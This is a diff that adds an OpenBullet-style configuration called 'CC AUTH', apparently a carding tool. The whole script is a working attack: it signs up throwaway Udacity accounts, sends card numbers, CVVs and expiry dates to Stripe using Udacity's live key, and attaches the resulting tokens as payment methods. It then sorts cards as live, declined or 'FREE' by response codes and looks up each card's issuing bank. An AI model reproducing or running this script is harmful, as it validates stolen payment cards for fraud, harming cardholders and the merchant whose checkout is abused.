@@ -1,0 +1,236 @@
+[SETTINGS]
+{
+  "Name": "CC AUTH",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2022-03-17T00:27:56.6548746+02:00",
+  "AdditionalInfo": "https://t.me/Koko_Nader",
+  "Author": "𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁 (🔥)/@Koko_Nader",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#guid FUNCTION GenerateGUID -> VAR "guid" 
+
+#muid FUNCTION GenerateGUID -> VAR "muid" 
+
+#sid FUNCTION GenerateGUID -> VAR "sid" 
+
+#F FUNCTION RandomString "?u?l?l?l?l?l" -> VAR "F" 
+
+#L FUNCTION RandomString "?u?l?l?l?l?l" -> VAR "L" 
+
+#mail FUNCTION RandomString "?l?l?l?l?l?l?l?l?d?d?d?d?d?d@gmail.com" -> VAR "mail" 
+
+REQUEST POST "https://auth.udacity.com/api/user/signup" 
+  CONTENT "{\"first_name\":\"<F>\",\"last_name\":\"<L>\",\"email\":\"<mail>\",\"password\":\"<mail>M\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-length: 114" 
+  HEADER "content-type: application/json" 
+  HEADER "origin: https://auth.udacity.com" 
+  HEADER "referer: https://auth.udacity.com/sign-up?next=https://classroom.udacity.com" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+  HEADER "x-udacity-ads-are-blocked: unknown" 
+
+PARSE "<SOURCE>" JSON "jwt" -> VAR "jwt" 
+
+REQUEST GET "https://classroom.udacity.com/api/community/v1/profiles/me" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: Bearer <jwt>" 
+  HEADER "referer: https://classroom.udacity.com/settings/personal-info" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<SOURCE>" DoesNotContain "API rate limit exceeded" 
+  KEYCHAIN Ban OR 
+    KEY "API rate limit exceeded" 
+
+#id PARSE "<SOURCE>" JSON "id" -> VAR "idd" 
+
+REQUEST POST "https://api.stripe.com/v1/tokens" 
+  CONTENT "card[name]=<Name>&card[address_zip]=10080&card[address_country]=US&card[number]=<cc>&card[cvc]=<cvv>&card[exp_month]=<mes>&card[exp_year]=<ano>&guid=<guid>&muid=<muid>&sid=<sid>&payment_user_agent=stripe.js%2F7e5462ae1%3B+stripe-js-v3%2F7e5462ae1&time_on_page=56128&key=pk_live_4ubp5nwZfwTgHyToeeygtLYh&pasted_fields=number" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "content-length: 439" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://js.stripe.com" 
+  HEADER "referer: https://js.stripe.com/" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "object\": \"token\"," 
+  KEYCHAIN Failure OR 
+    KEY "<SOURCE>" DoesNotContain "object\": \"token\"," 
+
+#id PARSE "<SOURCE>" JSON "id" -> VAR "id" 
+
+REQUEST POST "https://classroom.udacity.com/api/braavos/users/<idd>/payment_methods" 
+  CONTENT "{\"provider\":\"stripe\",\"card_token\":\"<id>\"}" 
+  CONTENTTYPE "application/json; charset=UTF-8" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "authorization: Bearer <jwt>" 
+  HEADER "content-length: 65" 
+  HEADER "content-type: application/json; charset=UTF-8" 
+  HEADER "origin: https://classroom.udacity.com" 
+  HEADER "referer: https://classroom.udacity.com/settings/subscriptions" 
+  HEADER "sec-ch-ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Google Chrome\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+PARSE "<SOURCE>" LR "{\"errors\":[\"" "\"]" CreateEmpty=FALSE -> CAP "message" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "card_declined" 
+    KEY "fraudulent" 
+    KEY "Your card was declined." 
+    KEY "requires_payment_method" 
+    KEY "incorrect_number" 
+    KEY "service_not_allowed" 
+    KEY "do_not_honor" 
+    KEY "generic_decline" 
+    KEY "parameter_invalid_empty" 
+    KEY "lock_timeout" 
+    KEY "Your card does not support this type of purchase." 
+    KEY "card_not_supported" 
+    KEY "Your card is not supported." 
+    KEY "Payment cannot be processed, missing credit card number" 
+    KEY "transaction_not_allowed" 
+    KEY "Invalid Card Pattern" 
+    KEY "Invalid card object: must be a dictionary or a non-empty string" 
+    KEY "invalid_expiry_month" 
+    KEY "Your card's expiration date is in the past." 
+    KEY "Your card number is incomplete." 
+    KEY "Your card does not support this type of purchase." 
+    KEY "Failed to recieve the response from the HTTP-server" 
+    KEY "requires_action" 
+  KEYCHAIN Success OR 
+    KEY "approved_by_network" 
+    KEY "{\"redirect_url\":" 
+    KEY "\"cvc_check\": \"pass\"" 
+    KEY "status\": \"succeeded\"" 
+    KEY "https://pay.stripe.com/receipts/" 
+  KEYCHAIN Retry OR 
+    KEY "Request rate limit exceeded. You can learn more about rate limits here " 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "Your card has insufficient funds" 
+    KEY "Your card's security code is incorrect" 
+    KEY "You cannot confirm this PaymentIntent because it has already succeeded after being previously confirmed." 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "stolen_card" 
+    KEY "lost_card" 
+    KEY "stripe_3ds2_fingerprint" 
+    KEY "three_d_secure_redirect" 
+
+#BIN_LOOKUP REQUEST GET "https://lookup.binlist.net/<cc>" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,ar;q=0.8,ar-EG;q=0.7" 
+  HEADER "accept-version: 3" 
+  HEADER "origin: https://binlist.net" 
+  HEADER "referer: https://binlist.net/" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"94\", \"Google Chrome\";v=\"94\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-ch-ua-platform: \"Windows\"" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-site" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36" 
+  HEADER "x-client: Node.js 2.0.1" 
+
+PARSE "<SOURCE>" LR "scheme\":\"" "\",\"" CreateEmpty=FALSE -> CAP "CARD" 
+
+PARSE "<SOURCE>" LR "type\":\"" "\",\"" CreateEmpty=FALSE -> CAP "TYPE" 
+
+PARSE "<SOURCE>" LR "brand\":\"" "\",\"" CreateEmpty=FALSE -> CAP "BRAND" 
+
+PARSE "<SOURCE>" LR "prepaid\":" ",\"" -> VAR "Prepaid" 
+
+PARSE "<SOURCE>" LR "name\":\"" "\",\"" CreateEmpty=FALSE -> CAP "COUNTRY" 
+
+PARSE "<SOURCE>" LR "bank\":{\"name\":\"" "\",\"" CreateEmpty=FALSE -> CAP "BANK NAME" 
+
+#info FUNCTION Constant "𖣔 𝙶𝙴𝙾𝚁𝙶𝙴 𝙽𝙰𝙳𝙴𝚁(🔝)/@Koko_Nader" -> CAP "Config By " 
+
